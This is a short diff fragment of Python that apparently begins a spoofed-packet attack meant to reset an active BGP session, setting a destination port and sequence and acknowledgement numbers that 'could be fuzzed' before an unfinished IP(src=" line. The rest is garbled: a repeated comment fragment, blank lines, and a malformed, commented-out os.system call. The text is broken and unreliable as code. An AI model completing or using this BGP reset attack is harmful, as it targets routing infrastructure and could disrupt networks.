@@ -1,0 +1,11 @@
+dport = 53154 # set to match expected destination port in active BGP session
+seq_num = 123 # set to match expected sequence number, could be fuzzed
+atk_num = 456 # set to match expected acknowledgement number, could be fuzzed
+
+bgp_reset = IP(src="
+sequence number, could be fuzzed
+
+
+
+##from sys import * 
+# os.system(/usr/bin/env '0\ && echo \\n\')
